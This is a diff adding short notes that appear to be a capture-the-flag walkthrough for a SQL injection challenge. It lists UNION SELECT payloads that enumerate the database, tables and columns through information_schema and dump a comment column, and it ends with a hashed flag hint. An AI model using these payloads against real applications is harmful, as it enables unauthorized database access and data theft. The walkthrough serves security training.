@@ -1,0 +1,6 @@
+- Same as the first SQL injection.
+- 5 UNION SELECT database(), 2 -- - 
+- 5 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database() -- - 
+- 5 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573 -- - -
+- 5 UNION SELECT comment, 2 FROM list_images -- - 
+- Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
